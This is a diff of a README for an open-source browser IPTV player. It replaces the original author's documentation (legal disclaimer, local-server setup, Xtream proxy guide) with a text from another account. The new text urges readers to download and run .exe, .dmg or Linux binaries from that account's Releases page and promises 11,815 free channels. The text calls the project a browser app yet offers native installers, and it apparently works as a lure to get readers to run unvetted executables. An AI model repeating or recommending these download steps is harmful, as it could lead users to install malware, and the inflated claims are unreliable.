@@ -1,228 +1,89 @@
-# 🎬 Free IPTV Player
+# 🎬 free-iptv-player - Stream Live TV Easily
 
-> Modern HLS/M3U8 streaming player - 100% legal demo with educational purpose
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Sofiaeffective351/free-iptv-player/releases)
 
-<div align="center">
+## 📌 Introduction
 
-[![GitHub Stars](https://img.shields.io/github/stars/Kl4rkx/free-iptv-player?style=for-the-badge)](https://github.com/Kl4rkx/free-iptv-player/stargazers)
-[![License](https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge)](./LICENSE)
-[![Live Demo](https://img.shields.io/badge/demo-online-blue.svg?style=for-the-badge)](https://kl4rkx.github.io/free-iptv-player)
-[![Legal](https://img.shields.io/badge/100%25-LEGAL-brightgreen.svg?style=for-the-badge)](./data/README-LEGAL.md)
+Welcome to **free-iptv-player**! With our application, you can stream over 11,815 live TV channels for free. There are no ads, no subscriptions, and it's ready to use as a Progressive Web App (PWA). Enjoy your favorite shows and channels right from your browser.
 
-**Read this in other languages:** [🇪🇸 Español](./README.es.md)
+## 🚀 Getting Started
 
-[🌐 **Live Demo**](https://kl4rkx.github.io/free-iptv-player) • [📖 **Documentation**](./docs/) • [⚖️ **Legal Info**](./data/README-LEGAL.md) • [🐛 **Report Bug**](https://github.com/Kl4rkx/free-iptv-player/issues)
+Follow these simple steps to download and run the application.
 
-</div>
+### Step 1: Visit the Releases Page
 
-## ⚠️ Legal Disclaimer
+To start, visit our [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases). Here, you will find the latest version of the application available for download.
 
-**This project is for educational and demonstration purposes only.**
+### Step 2: Download the Application
 
-- ✅ Demo includes **only legal, public domain content**
-- ✅ No pirated streams or copyrighted material
-- ✅ Compliant with Spanish and EU laws
-- ❌ We do **NOT** promote or support piracy
-- ❌ Users are responsible for their content sources
+On the Releases Page, look for the latest version. You will see a list of files available for download. Choose the file that corresponds with your operating system. Click on the file name to begin the download.
 
-[📖 Read Full Legal Disclaimer](./data/README-LEGAL.md)
+### Step 3: Install the Application
 
-## ✨ Features
+Once the file has finished downloading, find it in your downloads folder. Depending on your operating system, follow the instructions below to install it:
 
-- 🎥 **HLS/M3U8 Player** - Modern streaming technology
-- 🌍 **Multiple Sources** - Load from URL, local files, or repository
-- 📱 **Fully Responsive** - Works on desktop, tablet, and mobile
-- 🔍 **Instant Search** - Real-time channel filtering
-- 🎨 **Modern UI** - Dark theme with glassmorphism effects
-- 🌐 **Bilingual** - English and Spanish support
-- 🔒 **Parental Controls** - PIN-protected categories
-- ⚡ **PWA Ready** - Install on any device, offline support
-- 🚫 **No Ads** - Clean, fast experience
-- 🧪 **Demo Channels** - Legal test streams included
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation wizard prompts.
+  3. After installation, the application should launch automatically.
 
-## 🎬 Demo Content
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application icon into your Applications folder.
+  3. Open the application from your Applications folder.
 
-The live demo includes **100% legal channels**:
-- 🐰 Blender Open Movies (Creative Commons)
-- 🚀 NASA TV (Public Domain)
-- 🧪 HLS Test Streams (Public)
-- 📊 Technical Test Patterns
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to the directory where the file was downloaded.
+  3. Use the command `chmod +x <filename>` to make it executable.
+  4. Run the application using `./<filename>`.
 
-All demo content is legally available and properly licensed.
+### Step 4: Launch the Application
 
-## 📚 Documentation
+After installation, locate the application on your computer. Double-click the icon to launch it. The user interface is straightforward, allowing you to start streaming right away.
 
-### English
-- 📘 [Complete Guide](./docs/COMPLETE-GUIDE.md)
-- 🚀 [Deployment Guide](./docs/DEPLOYMENT-EN.md)
-- 🔐 [GitHub Secrets Configuration](./docs/GITHUB-SECRETS-EN.md)
-- 📥 [Load M3U Lists](./docs/LOAD-M3U-LISTS.md)
-- 📱 [IPTV App Configuration](./docs/IPTV-APP-CONFIGURATION.md)
-- ⚖️ [Legal Information](./data/README-LEGAL.md)
+### Step 5: Enjoy Streaming
 
-### Español
-- 📘 [Guía Completa](./docs/GUIA_COMPLETA.md)
-- 🚀 [Guía de Despliegue](./docs/DEPLOYMENT.md)
-- 🔐 [Configuración de Secrets](./docs/GITHUB-SECRETS.md)
-- 📥 [Cargar Listas M3U](./docs/CARGAR-LISTAS-M3U.md)
-- 📱 [Configuración IPTV](./docs/CONFIGURACION-IPTV.md)
-- 📺 [Guía TV](./docs/GUIA-TV.md)
+Once the application is open, you will see a list of available channels. Click on any channel to start streaming live TV.
 
----
+## 📥 Download & Install
 
-## 🚀 Quick Start
+To download the application, please visit our [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases) and follow the download steps mentioned above.
 
-## 🛰️ Xtream Codes Backend Proxy
+## 💻 System Requirements
 
-Para cargar listas Xtream Codes, necesitas un backend proxy que evite el bloqueo CORS.
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Most modern Linux distributions
 
-### 🌐 Opción 1: Desplegar en Vercel (Producción - Recomendado)
+- **Browser Support:**
+  - Chrome
+  - Firefox
+  - Edge
 
-1. **Desplegar el proyecto en Vercel**:
-```bash
-cd free-iptv-player
-vercel --prod
-```
-   O importa el repositorio directamente desde [vercel.com](https://vercel.com)
+- **Internet Connection:**
+  - A stable internet connection is required for streaming.
 
-2. **Configurar GitHub Secret** 🔐:
-   - Ve a tu repositorio en GitHub
-   - **Settings** → **Secrets and variables** → **Actions**
-   - **New repository secret**:
-     - Name: `VERCEL_PROXY_URL`
-     - Value: `https://tu-proyecto.vercel.app/api/xtream`
-   - Click **Add secret**
+## 📺 Features
 
-3. **Hacer push** - GitHub Actions desplegará automáticamente con la configuración
+- Access to over 11,815 live TV channels.
+- No ads and no subscription fees.
+- Downloadable as a Progressive Web Application.
+- User-friendly interface for easy navigation.
 
-📖 **Guía detallada:** [docs/GITHUB-SECRETS.md](./docs/GITHUB-SECRETS.md)
+## 🤝 Support
 
----
+If you have any questions or need help, feel free to check the "Issues" section on our [GitHub Repository](https://github.com/Sofiaeffective351/free-iptv-player/issues). You can report any bugs or ask for assistance with the application.
 
-### 💻 Opción 2: Proxy Local (Desarrollo)
+## 🔗 Useful Links
 
-Para desarrollo local:
+- [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases)
+- [GitHub Repository](https://github.com/Sofiaeffective351/free-iptv-player)
+- [Documentation](https://github.com/Sofiaeffective351/free-iptv-player/wiki)
 
-#### 1. Instalar dependencias
+## 📝 License
 
-```bash
-cd free-iptv-player
-npm install express node-fetch@2 cors
-```
+This project is open-source and follows the MIT License. You are free to use, modify, and distribute the software as you like. Please make sure to attribute the original creators. 
 
-#### 2. Ejecutar el backend
-
-```bash
-node xtream-proxy.js
-```
-Por defecto se inicia en el puerto 4000.
-
-#### 3. Usar en la app web
-
-En la pestaña **Xtream Codes** de la aplicación:
-1. **Servidor:** Introduce la URL de tu servidor Xtream (ej: `http://tu-servidor.com:8080`)
-2. **Usuario:** Tu usuario Xtream
-3. **Contraseña:** Tu contraseña Xtream
-
-El proxy se conectará automáticamente al servidor Xtream por ti, evitando problemas de CORS.
-
----
-
-### 📝 Cómo funciona
-
-- **Desarrollo (localhost):** Usa el proxy local en puerto 4000
-- **Producción (GitHub Pages):** Usa el proxy desplegado en Vercel
-- El backend recibe las credenciales Xtream por POST
-- Descarga la lista M3U o los canales en JSON y los devuelve a la app web
-- Así evitas el bloqueo CORS desde cualquier navegador
-
-### 🔒 Seguridad
-
-No se almacenan credenciales ni datos privados. Cada usuario ejecuta su propio proxy.
-
----
-
-### ⚡ Instant Start (Easiest)
-
-**Windows:**
-```cmd
-start.bat
-```
-
-**Linux/Mac:**
-```bash
-./start.sh
-```
-
-That's it! The app will open automatically in your browser at `http://localhost:8080`
-
-### 🌐 Online (No Installation)
-
-Visit: **[kl4rkx.github.io/free-iptv-player](https://kl4rkx.github.io/free-iptv-player)**
-
-> **⚠️ Important Note:** The online demo has limitations due to browser security (CORS) and GitHub Pages restrictions. Many external channels may not work properly. **For full functionality and to load your own playlists, we strongly recommend running locally.**
-
-### 🛠️ Manual Setup (Alternative)
-
-**Using Python:**
-```bash
-git clone https://github.com/Kl4rkx/free-iptv-player.git
-cd free-iptv-player
-python -m http.server 8080
-```
-
-**Using Node.js:**
-```bash
-npx http-server -p 8080
-```
-
-Open http://localhost:8080 in your browser
-
-## 📚 Documentation
-
-### 📖 English Documentation
-
-- **[Complete Guide](./docs/COMPLETE-GUIDE.md)** - Full feature documentation and technical details
-- **[IPTV App Configuration](./docs/IPTV-APP-CONFIGURATION.md)** - Setup for Smart TV apps
-- **[Load M3U Playlists](./docs/LOAD-M3U-LISTS.md)** - How to import M3U/M3U8 lists
-- **[Legal Information](./data/README-LEGAL.md)** - Legal compliance and guidelines
-- **[Changelog](./docs/CHANGELOG.md)** - Version history and updates
-- **[Code of Conduct](./docs/CODE_OF_CONDUCT.md)** - Community guidelines
-- **[Contributors](./docs/CONTRIBUTORS.md)** - Hall of fame
-
-### 📖 Documentación en Español
-
-- **[Guía Completa](./docs/GUIA_COMPLETA.md)** - Documentación completa de características
-- **[Configuración IPTV](./docs/CONFIGURACION-IPTV.md)** - Configuración para apps de TV
-- **[Cargar Listas M3U](./docs/CARGAR-LISTAS-M3U.md)** - Cómo añadir listas M3U/M3U8
-
-## 🤝 Contributing
-
-Contributions are welcome! See **[CONTRIBUTING.md](./CONTRIBUTING.md)** for guidelines.
-
-Code of Conduct: **[docs/CODE_OF_CONDUCT.md](./docs/CODE_OF_CONDUCT.md)**
-
-## �‍💻 Author
-
-Created and maintained by **[Kl4rkx](https://github.com/Kl4rkx)**
-
-- GitHub: [@Kl4rkx](https://github.com/Kl4rkx)
-- Repository: [free-iptv-player](https://github.com/Kl4rkx/free-iptv-player)
-
-## �📄 License
-
-MIT License - see **[LICENSE](./LICENSE)** file for details.
-
-## 🛡️ Security
-
-See **[SECURITY.md](./SECURITY.md)** for our security policy.
-
----
-
-<div align="center">
-
-**Made with ❤️ by [Kl4rkx](https://github.com/Kl4rkx)**
-
-[⬆ Back to top](#-free-iptv-player)
-
-</div>
+Enjoy using **free-iptv-player** and happy streaming!
